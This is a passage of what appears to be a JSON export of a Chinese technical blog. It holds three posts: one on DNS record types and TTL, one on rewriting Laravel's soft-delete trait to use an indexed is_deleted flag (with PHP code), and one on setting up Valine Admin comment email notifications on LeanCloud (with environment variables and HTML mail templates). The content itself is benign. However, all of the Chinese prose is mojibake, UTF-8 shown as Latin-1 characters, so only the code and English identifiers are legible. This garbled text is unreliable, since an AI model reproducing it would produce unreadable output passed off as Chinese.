ä¸ºæˆ‘ä»¬åœ¨åŸŸåæœåŠ¡å•†é‚£é‡Œæäº¤äº†åŸŸåè®°å½•ã€‚è´­ä¹°äº†ä¸€ä¸ªåŸŸåä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨åŸŸåæœåŠ¡å•†é‚£é‡Œè®¾ç½®åŸŸåè§£æçš„è®°å½•ï¼ŒåŸŸåæœåŠ¡å•†æŠŠè¿™äº›è®°å½•æ¨é€åˆ°æƒå¨åŸŸåæœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬çš„åŸŸåæ‰èƒ½æ­£å¼ç”Ÿæ•ˆã€‚ åœ¨è®¾ç½®åŸŸåè®°å½•çš„æ—¶å€™ï¼Œä¼šé‡åˆ°ã€ŒA è®°å½•ã€ã€ã€ŒCNAMEã€ ç­‰ä¸åŒç±»å‹ï¼Œè¿™æ­£æ˜¯å‰é¢åšåŸŸåè§£æçš„æ—¶å€™æˆ‘ä»¬ç¢°åˆ°çš„ç»“æœã€‚è¿™äº›ç±»å‹æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå®ƒä»¬ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¸¸è§çš„è®°å½•ç±»å‹ã€‚ A è®°å½•ã€‚A (Address) è®°å½•ç”¨æ¥ç›´æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„ IP åœ°å€ã€‚ä¸»æœºåå°±æ˜¯åŸŸåå‰ç¼€ï¼Œå¸¸è§æœ‰å¦‚ä¸‹å‡ ç§ï¼š wwwï¼šè§£æåçš„åŸŸåä¸º www.0x2beace.comï¼Œä¸€èˆ¬ç”¨äºç½‘ç«™åœ°å€ã€‚ @ï¼šç›´æ¥è§£æä¸»åŸŸåã€‚ *ï¼šæ³›è§£æï¼ŒæŒ‡å°† *.yourdomain.com è§£æåˆ°åŒä¸€ IPã€‚ CNAME è®°å½•ã€‚CNAME çš„å…¨ç§°æ˜¯ Canonical Nameï¼Œé€šå¸¸ç§°åˆ«åè®°å½•ã€‚å¦‚æœéœ€è¦å°†åŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œå†ç”±å¦ä¸€ä¸ªåŸŸåæä¾› IP åœ°å€ï¼Œå°±éœ€è¦æ·»åŠ  CNAME è®°å½•ã€‚ MX è®°å½•ã€‚é‚®ä»¶äº¤æ¢è®°å½•ï¼Œç”¨äºå°†ä»¥è¯¥åŸŸåä¸ºç»“å°¾çš„ç”µå­é‚®ä»¶æŒ‡å‘å¯¹åº”çš„é‚®ä»¶æœåŠ¡å™¨ä»¥è¿›è¡Œå¤„ç†ã€‚ NS è®°å½•ã€‚åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœéœ€è¦æŠŠå­åŸŸåäº¤ç»™å…¶ä»– DNS æœåŠ¡å™¨è§£æï¼Œå°±éœ€è¦æ·»åŠ  NS è®°å½•ã€‚ AAAA è®°å½•ã€‚ç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„ IPv6 åœ°å€ï¼Œä¸å¸¸ç”¨ã€‚ TXT è®°å½•ã€‚å¯ä»¥å¡«å†™ä»»ä½•ä¸œè¥¿ï¼Œé•¿åº¦é™åˆ¶ 255ã€‚ç»å¤§å¤šæ•°çš„ TXT è®°å½•æ˜¯ç”¨æ¥åš SPF è®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ï¼ŒMX è®°å½•çš„ä½œç”¨æ˜¯ç»™å¯„ä¿¡è€…æŒ‡æ˜æŸä¸ªåŸŸåçš„é‚®ä»¶æœåŠ¡å™¨æœ‰å“ªäº›ã€‚SPF çš„ä½œç”¨è·Ÿ MX ç›¸åï¼Œå®ƒå‘æ”¶ä¿¡è€…è¡¨æ˜ï¼Œå“ªäº›é‚®ä»¶æœåŠ¡å™¨æ˜¯ç»è¿‡æŸä¸ªåŸŸåè®¤å¯ä¼šå‘é€é‚®ä»¶çš„ã€‚ æ˜¾æ€§ URLã€‚ä»ä¸€ä¸ªåœ°å€ 301 é‡å®šå‘ï¼ˆä¹Ÿå«ã€Œæ°¸ä¹…æ€§è½¬ç§»ã€ï¼‰åˆ°å¦ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼Œå°±éœ€è¦æ·»åŠ æ˜¾æ€§ URL è®°å½•ã€‚ éšæ€§ URLã€‚ä»ä¸€ä¸ªåœ°å€ 302 è·³è½¬ï¼ˆä¹Ÿå«ã€Œä¸´æ—¶è·³è½¬ã€ï¼‰åˆ°å¦ä¸€ä¸ªåœ°å€ï¼Œéœ€è¦æ·»åŠ éšæ€§ URL è®°å½•ã€‚å®ƒç±»ä¼¼äºæ˜¾æ€§ URLï¼ŒåŒºåˆ«åœ¨äºéšæ€§ URL ä¸ä¼šæ”¹å˜åœ°å€æ ä¸­çš„åŸŸåã€‚ åœ¨å¡«å†™å„ç§è®°å½•çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜ä¼šç¢°åˆ°ä¸€ä¸ªç‰¹æ®Šçš„è®¾ç½®é¡¹â€”â€”TTLï¼Œç”Ÿå­˜æ—¶é—´ï¼ˆTime To Liveï¼‰ã€‚ TTLè¡¨ç¤ºè§£æè®°å½•åœ¨ DNS æœåŠ¡å™¨ä¸­çš„ç¼“å­˜æ—¶é—´ï¼Œæ—¶é—´é•¿åº¦å•ä½æ˜¯ç§’ï¼Œä¸€èˆ¬ä¸º3600ç§’ã€‚æ¯”å¦‚ï¼šåœ¨è®¿é—®news.qq.com æ—¶ï¼Œå¦‚æœåœ¨ DNS æœåŠ¡å™¨çš„ç¼“å­˜ä¸­æ²¡æœ‰è¯¥è®°å½•ï¼Œå°±ä¼šå‘æŸä¸ª NS æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè·å¾—è¯¥è®°å½•åï¼Œè¯¥è®°å½•ä¼šåœ¨ DNS æœåŠ¡å™¨ä¸Šä¿å­˜TTLçš„æ—¶é—´é•¿åº¦ï¼Œåœ¨TTLæœ‰æ•ˆæœŸå†…è®¿é—® news.qq.comï¼ŒDNS æœåŠ¡å™¨ä¼šç›´æ¥ç¼“å­˜ä¸­è¿”å›åˆšæ‰çš„è®°å½•ã€‚ åŸæ–‡é“¾æ¥ åŸŸåèƒŒåé‚£äº›äº‹","categories":[],"tags":[{"name":"åŸŸå","slug":"åŸŸå","permalink":"https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"}]},{"title":"å¦‚ä½•æ›´å¥½çš„ä½¿ç”¨ Laravel è½¯åˆ é™¤","slug":"how-to-better-use-laravel-soft-delete","date":"2021-04-10T12:26:01.000Z","updated":"2021-04-10T12:27:07.466Z","comments":true,"path":"how-to-better-use-laravel-soft-delete/","link":"","permalink":"https://www.0x2beace.com/how-to-better-use-laravel-soft-delete/","excerpt":"é€šå¸¸å¯¹äºæ•°æ®åº“ä¸­æ¯”è¾ƒé‡è¦çš„æ•°æ®ï¼Œä¸ä¼šç›´æ¥åˆ é™¤ï¼Œè€Œæ˜¯é‡‡ç”¨è½¯åˆ é™¤ã€‚","text":"é€šå¸¸å¯¹äºæ•°æ®åº“ä¸­æ¯”è¾ƒé‡è¦çš„æ•°æ®ï¼Œä¸ä¼šç›´æ¥åˆ é™¤ï¼Œè€Œæ˜¯é‡‡ç”¨è½¯åˆ é™¤ã€‚ Laravel çš„Eloquent ä¹Ÿæä¾›ç›¸åº”çš„åŠŸèƒ½è¾¾åˆ°è½¯åˆ é™¤æ¨¡å‹çš„ç›®çš„ï¼Œä¸è¿‡ä¸ªäººè§‰å¾—Laravel çš„è½¯åˆ é™¤å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š Laravelä¸­ä½¿ç”¨äº†ä¸€ä¸ªæ—¥æœŸå­—æ®µä½œä¸ºæ ‡è¯†çŠ¶æ€ï¼Œdeleted_at é»˜è®¤å€¼ä¸ºNULLï¼Œå¦‚æœè®°å½•è¢«åˆ é™¤äº†ï¼Œdeleted_at çš„å€¼åˆ™ä¸ºå½“å‰æ—¶é—´æˆ³ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡is null or not is nullæŸ¥è¯¢ä¸€æ¡è®°å½•æ˜¯å¦è¢«åˆ é™¤ï¼Œè¿™ä¼šå¯¼è‡´Mysql å¼•æ“æ”¾å¼ƒä½¿ç”¨ç´¢å¼•è€Œè¿›è¡Œå…¨è¡¨æ‰«æï¼ŒæŸ¥è¯¢æ•ˆç‡å¯æƒ³è€ŒçŸ¥ã€‚ å¯ä»¥é€šè¿‡é‡å†™SoftDeletes.php ç±»æ¥ä¿®æ”¹Laravel SoftDelete çš„é€»è¾‘ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?phpnamespace App\\Models\\Traits;use Illuminate\\Database\\Eloquent\\SoftDeletes;trait SoftDeletesEx &#123; use SoftDeletes; /** * Boot the soft deleting trait for a model. * * @return void */ public static function bootSoftDeletes() &#123; static::addGlobalScope(new SoftDeletingScopeEx()); &#125; /** * Get the name of the \"deleted at\" column. * * * @return string */ public function getDeletedAtColumn() &#123; // è‡ªå®šä¹‰æ ‡è¯†å­—æ®µ return 'is_deleted'; &#125; /** * Perform the actual delete query on this model instance. * * @return void */ protected function runSoftDelete() &#123; $query = $this-&gt;newQueryWithoutScopes()-&gt;where($this-&gt;getKeyName(), $this-&gt;getKey()); // 0. æ­£å¸¸ 1. å·²åˆ é™¤ $this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; = $time = 1; $query-&gt;update([ $this-&gt;getDeletedAtColumn() =&gt; $time ]); &#125; /** * Restore a soft-deleted model instance. * * @return bool|null */ public function restore() &#123; // If the restoring event does not return false, we will proceed with this // restore operation. Otherwise, we bail out so the developer will stop // the restore totally. We will clear the deleted timestamp and save. if ($this-&gt;fireModelEvent('restoring') === false) &#123; return false; &#125; $this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; = 0; // Once we have saved the model, we will fire the \"restored\" event so this // developer will do anything they need to after a restore operation is // totally finished. Then we will return the result of the save call. $this-&gt;exists = true; $result = $this-&gt;save(); $this-&gt;fireModelEvent('restored', false); return $result; &#125; /** * Determine if the model instance has been soft-deleted. * * @return bool */ public function trashed() &#123; return ! ($this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; === 0); &#125;&#125; é€šè¿‡å®šä¹‰is_deleted å­—æ®µæ¥æ ‡ç¤ºæ˜¯å¦åˆ é™¤ï¼Œé»˜è®¤å€¼0. æœªåˆ é™¤ï¼Œ1. å·²åˆ é™¤ï¼ŒåŒæ—¶ç»™è¯¥å­—æ®µæ·»åŠ æ™®é€šç´¢å¼•ã€‚ æ¥ç€è¿˜éœ€è¦é‡å†™SoftDeletingScope.php ç±»ï¼Œçº¦æŸé»˜è®¤æŸ¥è¯¢is_deleted = 0 çš„è®°å½•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;?phpnamespace App\\Models\\Traits;use Illuminate\\Database\\Eloquent\\Builder;use Illuminate\\Database\\Eloquent\\Model;use Illuminate\\Database\\Eloquent\\SoftDeletingScope;class SoftDeletingScopeEx extends SoftDeletingScope &#123; /** * å°†çº¦æŸåŠ åˆ° Eloquent æŸ¥è¯¢æ„é€ ä¸­ï¼Œè¿™æ ·é»˜è®¤æŸ¥è¯¢çš„å°±æ˜¯ `is_deleted` = 0 çš„è®°å½•äº† * Apply the scope to a given Eloquent query builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @param \\Illuminate\\Database\\Eloquent\\Model $model * @return void */ public function apply(Builder $builder, Model $model) &#123; $builder-&gt;where($model-&gt;getQualifiedDeletedAtColumn(), 0); &#125; /** * Extend the query builder with the needed functions. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ public function extend(Builder $builder) &#123; foreach ($this-&gt;extensions as $extension) &#123; $this-&gt;&#123;\"add&#123;$extension&#125;\"&#125;($builder); &#125; $builder-&gt;onDelete(function (Builder $builder) &#123; $column = $this-&gt;getDeletedAtColumn($builder); return $builder-&gt;update([ $column =&gt; \\DB::Raw('UNIX_TIMESTAMP(NOW())') ]); &#125;); &#125; /** * Add the restore extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addRestore(Builder $builder) &#123; $builder-&gt;macro('restore', function (Builder $builder) &#123; $builder-&gt;withTrashed(); return $builder-&gt;update([ $builder-&gt;getModel() -&gt;getDeletedAtColumn() =&gt; 0 ]); &#125;); &#125; /** * Add the without-trashed extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addWithoutTrashed(Builder $builder) &#123; $builder-&gt;macro('withoutTrashed', function (Builder $builder) &#123; $model = $builder-&gt;getModel(); $builder-&gt;withoutGlobalScope($this) -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), 0); return $builder; &#125;); &#125; /** * Add the only-trashed extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addOnlyTrashed(Builder $builder) &#123; $builder-&gt;macro('onlyTrashed', function (Builder $builder) &#123; $model = $builder-&gt;getModel(); $builder-&gt;withoutGlobalScope($this) -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), '&lt;&gt;', 0); return $builder; &#125;); &#125;&#125; æœ€ååº”ç”¨åˆ°Model ä¸­ï¼š 1234567891011121314&lt;?phpnamespace App\\Models;use Illuminate\\Database\\Eloquent\\Model;use App\\Models\\Traits\\SoftDeletesEx;class User extends Model&#123; use SoftDeletesEx; protected $table = 'user'; protected $dates = [\"is_deleted\"];&#125; å‚è€ƒé“¾æ¥ laravelæ¡†æ¶è‡ªå®šä¹‰è½¯åˆ é™¤ Laravel5è½¯åˆ é™¤ï¼ˆSoftDeletesï¼‰çš„deleted_atæ”¹é€ ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Valine å¦‚ä½•å¼€å¯è¯„è®ºé‚®ä»¶é€šçŸ¥","slug":"how-does-valine-turn-on-comment-email-notifications","date":"2021-04-05T12:22:51.000Z","updated":"2021-04-05T12:23:45.789Z","comments":true,"path":"how-does-valine-turn-on-comment-email-notifications/","link":"","permalink":"https://www.0x2beace.com/how-does-valine-turn-on-comment-email-notifications/","excerpt":"äº‹æƒ…æ˜¯è¿™æ ·çš„ï¼Œæ˜¨å¤©æ— æ„åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€æ¡ç•™è¨€ï¼Œç•™è¨€æ—¶é—´æ˜¯ä¸¤å¤©ä¹‹å‰ï¼Œæˆ‘æ‰æ„è¯†åˆ°ç›®å‰çš„è¯„è®ºç³»ç»Ÿç¼ºå°‘é€šçŸ¥ =_=!ã€‚","text":"äº‹æƒ…æ˜¯è¿™æ ·çš„ï¼Œæ˜¨å¤©æ— æ„åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€æ¡ç•™è¨€ï¼Œç•™è¨€æ—¶é—´æ˜¯ä¸¤å¤©ä¹‹å‰ï¼Œæˆ‘æ‰æ„è¯†åˆ°ç›®å‰çš„è¯„è®ºç³»ç»Ÿç¼ºå°‘é€šçŸ¥ =_=!ã€‚ æ²¡æœ‰é€šçŸ¥è¿™æ€ä¹ˆèƒ½è¡Œå‘¢ï¼Ÿå› ä¸ºæˆ‘ç”¨çš„æ˜¯ä¸€æ¬¾å«åšValine çš„è¯„è®ºç³»ç»Ÿï¼Œé©¬ä¸ŠGoogle äº†ä¸€ä¸‹ï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡ç¬”è®°ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„å†…å®¹ï¼Œå¯èƒ½ä¸é€‚ç”¨å…¶ä»–è¯„è®ºç³»ç»Ÿã€‚ Valine Admin æ˜¯ Valine è¯„è®ºç³»ç»Ÿçš„åç«¯åŠŸèƒ½è¡¥å……å’Œå¢å¼ºï¼Œä¸»è¦å®ç°è¯„è®ºé‚®ä»¶é€šçŸ¥ã€è¯„è®ºç®¡ç†ã€åƒåœ¾è¯„è®ºè¿‡æ»¤ç­‰åŠŸèƒ½ã€‚æ”¯æŒå®Œå…¨è‡ªå®šä¹‰çš„é‚®ä»¶é€šçŸ¥æ¨¡æ¿ï¼ŒåŸºäºAkismet APIå®ç°å‡†ç¡®çš„åƒåœ¾è¯„è®ºè¿‡æ»¤ã€‚ åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œé¦–å…ˆå¾—æ³¨å†Œä¸€ä¸ªLeanCloud è´¦å·ã€‚ LeanCloud æ˜¯ä»€ä¹ˆï¼Ÿ å®ƒæ˜¯ä¸€ç«™å¼åç«¯äº‘æœåŠ¡æä¾›å•†ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬çš„è¯„è®ºç³»ç»Ÿå°±æ˜¯è¦éƒ¨ç½²åœ¨è¿™ä¸ªäº‘æœåŠ¡ä¸Šã€‚ åˆ›å»ºäº‘å¼•æ“æ³¨å†ŒæˆåŠŸä¹‹åï¼Œè¿›å…¥æ§åˆ¶å°ï¼Œæ–°å»ºä¸€ä¸ªåº”ç”¨ï¼š é€‰æ‹©å¼€å‘æ¿å°±å¥½ã€‚ ç„¶åè¿›å…¥åˆšåˆ›å»ºå¥½çš„åº”ç”¨ï¼Œä¾æ¬¡ç‚¹å‡»è®¾ç½®=&gt; åº”ç”¨Keyï¼Œå¯ä»¥çœ‹åˆ°AppID å’ŒAppKeyï¼Œè¿™ä¸¤ä¸ªä¸œè¥¿å¾ˆé‡è¦ï¼Œ æ‰“å¼€åšå®¢ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨å¯¹åº”çš„ä½ç½®åˆ†åˆ«å¡«ä¸ŠappIdå’ŒappKeyï¼š ä¸‹ä¸€æ­¥éœ€è¦ç»‘å®šåŸŸåï¼Œè¿™é‡Œéœ€è¦ç»‘å®šçš„åŸŸåï¼Œå°±æ˜¯ä½ çš„åšå®¢çš„åŸŸåï¼Œå›½å†…ç‰ˆå¯èƒ½æœ‰å¤šä¸ªåŸŸåç»‘å®šä¾›é€‰ï¼Œè¿™é‡Œé€‰æ‹©äº‘å¼•æ“å°±å¥½ã€‚ åˆ°æ—¶å€™è¿™ä¸ªåŸŸåå°±æ˜¯è¿›å…¥æˆ‘ä»¬çš„è¯„è®ºç³»ç»Ÿçš„å…¥å£ã€‚ éœ€è¦å…ˆå®ŒæˆCNAME åŸŸåè§£æï¼Œç»‘å®šæ‰ä¼šç”Ÿæ•ˆã€‚ è¿›å…¥ä½ çš„åŸŸåç®¡ç†åå°ï¼Œæ·»åŠ ä¸€æ¡CNAME è®°å½•ï¼Œä¸»æœºåç§°å°±æ˜¯åˆšæ‰ç»‘å®šçš„å­åŸŸåã€‚ åŸŸåè§£ææ²¡é‚£ä¹ˆå¿«ï¼Œç­‰å¾…çš„æ—¶é—´å¯ä»¥å¼€å§‹é…ç½®äº‘å¼•æ“ã€‚ è¿›å…¥äº‘å¼•æ“=&gt;è®¾ç½®ï¼Œæ·»åŠ äº‘å¼•æ“ç¯å¢ƒå˜é‡ï¼š å˜é‡ ç¤ºä¾‹ è¯´æ˜ SITE_NAME Booâ€™s Blog [å¿…å¡«]åšå®¢åç§° SITE_URL https://0x2beace.com [å¿…å¡«]é¦–é¡µåœ°å€ SMTP_SERVICE QQ [æ–°ç‰ˆæ”¯æŒ]é‚®ä»¶æœåŠ¡æä¾›å•†ï¼Œæ”¯æŒ QQã€163ã€126ã€Gmail ä»¥åŠ æ›´å¤š SMTP_USER xxxxxx@qq.com [å¿…å¡«]SMTPç™»å½•ç”¨æˆ· SMTP_PASS ccxxxxxxxxch [å¿…å¡«]SMTPç™»å½•å¯†ç  SENDER_NAME Boo [å¿…å¡«]å‘ä»¶äºº SENDER_EMAIL xxxxxx@qq.com [å¿…å¡«]å‘ä»¶é‚®ç®± ADMIN_URL https://xxx.0x2beace.com/ [å»ºè®®]Webä¸»æœºäºŒçº§åŸŸåï¼ˆäº‘å¼•æ“åŸŸåï¼‰ï¼Œç”¨äºè‡ªåŠ¨å”¤é†’ BLOGGER_EMAIL xxxxx@gmail.com [å¯é€‰]åšä¸»é€šçŸ¥æ”¶ä»¶åœ°å€ï¼Œé»˜è®¤ä½¿ç”¨SENDER_EMAIL AKISMET_KEY xxxxxxxx [å¯é€‰]Akismet Key ç”¨äºåƒåœ¾è¯„è®ºæ£€æµ‹ï¼Œè®¾ä¸ºMANUAL_REVIEWå¼€å¯äººå·¥å®¡æ ¸ï¼Œç•™ç©ºä¸ä½¿ç”¨ååƒåœ¾ ç‚¹å‡»ä¿å­˜ä¹‹åï¼Œåˆ‡æ¢åˆ°äº‘å¼•æ“=&gt;éƒ¨ç½²ï¼Œéƒ¨ç½²æ¨¡å¼é€‰æ‹©éƒ¨ç½²é¡¹ç›®-Gitéƒ¨ç½²ï¼Œåˆ†æ”¯masterï¼Œæ‰‹åŠ¨éƒ¨ç½²ç›®æ ‡ç¯å¢ƒä¸ºç”Ÿäº§ç¯å¢ƒï¼ŒGit ä»“åº“å¡«å…¥ï¼šhttps://github.com/DesertsP/Valine-Admin.gitï¼Œç‚¹å‡»éƒ¨ç½²å³å¯ã€‚ è¯„è®ºç®¡ç†æ³¨å†Œç®¡ç†å‘˜å¦‚æœè¿™æ—¶åŸŸåè§£æå·²ç»å®Œæˆï¼Œé‚£ä¹ˆè®¿é—®ï¼šhttps://äº‘å¼•æ“åŸŸå/ï¼Œåº”è¯¥å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼š è¿™æ˜¯è¿˜æ²¡æœ‰ç®¡ç†å‘˜è´¦å·ï¼Œéœ€è¦å…ˆé€šè¿‡https://äº‘å¼•æ“åŸŸå/sign-up/æ³¨å†Œä¸€ä¸ªã€‚ è‡³æ­¤å°±å·²ç»å¯ä»¥ç®¡ç†æˆ‘ä»¬çš„è¯„è®ºäº†ï¼Œä½†æ˜¯ç›®å‰è¿˜æ²¡æœ‰é‚®ä»¶é€šçŸ¥ã€‚ è®¾ç½®å®šæ—¶ä»»åŠ¡è¿™é‡Œè®¾ç½®å®šæ—¶ä»»åŠ¡çš„ç›®çš„å°±æ˜¯ï¼Œæ¯å¤©å®šæ—¶æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼å‘çš„é‚®ä»¶ã€‚ è¿›å…¥äº‘å¼•æ“=&gt; å®šæ—¶ä»»åŠ¡ï¼Œåˆ›å»ºä¸¤ä¸ªå®šæ—¶ä»»åŠ¡ï¼š é€‰æ‹©self-wakeäº‘å‡½æ•°ï¼ŒCronè¡¨è¾¾å¼ä¸º0 */30 0-16 * * ?ï¼Œè¡¨ç¤ºæ¯å¤©æ—©0ç‚¹åˆ°æ™š16ç‚¹æ¯éš”30åˆ†é’Ÿè®¿é—®äº‘å¼•æ“ã€‚ é€‰æ‹©resend-mailsäº‘å‡½æ•°ï¼ŒCronè¡¨è¾¾å¼ä¸º0 0 0 * * ?ï¼Œè¡¨ç¤ºæ¯å¤©0ç‚¹æ£€æŸ¥è¿‡å»24å°æ—¶å†…æ¼å‘çš„é€šçŸ¥é‚®ä»¶å¹¶è¡¥å‘ã€‚ é‚®ä»¶é€šçŸ¥æ¨¡ç‰ˆ(å¯é€‰é…ç½®)é‚®ä»¶é€šçŸ¥æ¨¡æ¿åœ¨äº‘å¼•æ“ç¯å¢ƒå˜é‡ä¸­è®¾å®šï¼Œå¯è‡ªå®šä¹‰é€šçŸ¥é‚®ä»¶æ ‡é¢˜åŠå†…å®¹æ¨¡æ¿ã€‚ ç¯å¢ƒå˜é‡ ç¤ºä¾‹ è¯´æ˜ MAIL_SUBJECT ${PARENT_NICK}ï¼Œæ‚¨åœ¨${SITE_NAME}ä¸Šçš„è¯„è®ºæ”¶åˆ°äº†å›å¤ [å¯é€‰]@é€šçŸ¥é‚®ä»¶ä¸»é¢˜ï¼ˆæ ‡é¢˜ï¼‰æ¨¡æ¿ MAIL_TEMPLATE è§ä¸‹æ–‡ [å¯é€‰]@é€šçŸ¥é‚®ä»¶å†…å®¹æ¨¡æ¿ MAIL_SUBJECT_ADMIN ${SITE_NAME}ä¸Šæœ‰æ–°è¯„è®ºäº† [å¯é€‰]åšä¸»é‚®ä»¶é€šçŸ¥ä¸»é¢˜æ¨¡æ¿ MAIL_TEMPLATE_ADMIN è§ä¸‹æ–‡ [å¯é€‰]åšä¸»é‚®ä»¶é€šçŸ¥å†…å®¹æ¨¡æ¿ é‚®ä»¶é€šçŸ¥åŒ…å«ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯è¢«@é€šçŸ¥å’Œåšä¸»é€šçŸ¥ï¼Œè¿™ä¸¤ç§æ¨¡æ¿éƒ½å¯ä»¥å®Œå…¨è‡ªå®šä¹‰ã€‚é»˜è®¤ä½¿ç”¨ç»å…¸çš„è“è‰²é£æ ¼æ¨¡æ¿ï¼ˆæ ·å¼æ¥æºæœªçŸ¥ï¼‰ã€‚ é»˜è®¤è¢«@é€šçŸ¥é‚®ä»¶å†…å®¹æ¨¡æ¿å¦‚ä¸‹ï¼š 1&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;æ‚¨åœ¨&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt; $&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;ä¸Šçš„è¯„è®ºæœ‰äº†æ–°çš„å›å¤&lt;&#x2F;h2&gt; $&#123;PARENT_NICK&#125; åŒå­¦ï¼Œæ‚¨æ›¾å‘è¡¨è¯„è®ºï¼š&lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;PARENT_COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;å›å¤è¯´ï¼š&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;æ‚¨å¯ä»¥ç‚¹å‡»&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;æŸ¥çœ‹å›å¤çš„å®Œæ•´å…§å®¹&lt;&#x2F;a&gt;ï¼Œæ¬¢è¿å†æ¬¡å…‰ä¸´&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;ã€‚&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; é»˜è®¤åšä¸»é€šçŸ¥é‚®ä»¶å†…å®¹æ¨¡æ¿å¦‚ä¸‹ï¼š 1&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;æ‚¨åœ¨&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;ä¸Šçš„æ–‡ç« æœ‰äº†æ–°çš„è¯„è®º&lt;&#x2F;h2&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;å›å¤è¯´ï¼š&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;æ‚¨å¯ä»¥ç‚¹å‡»&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;æŸ¥çœ‹å›å¤çš„å®Œæ•´å…§å®¹&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; 